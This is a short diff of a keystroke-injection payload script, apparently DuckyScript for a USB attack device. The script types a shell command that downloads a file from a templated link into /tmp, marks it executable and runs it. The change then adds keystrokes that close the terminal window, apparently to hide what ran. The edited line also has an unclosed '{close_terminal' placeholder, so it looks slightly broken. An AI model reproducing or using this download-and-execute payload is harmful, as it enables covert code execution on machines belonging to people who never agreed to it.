@@ -7,6 +7,8 @@ DELAY 100
 ENTER
 DELAY 300
 REM DOUBLE CHECK WHERE THE TEMPORARY FOLDER IS
-STRING curl {link} -o /tmp/r; chmod +x /tmp/r; /tmp/r{close_bash}
+STRING curl {link} -o /tmp/r; chmod +x /tmp/r; /tmp/r{close_terminal
 DELAY 50
 ENTER
+DELAY 200
+COMMAND w
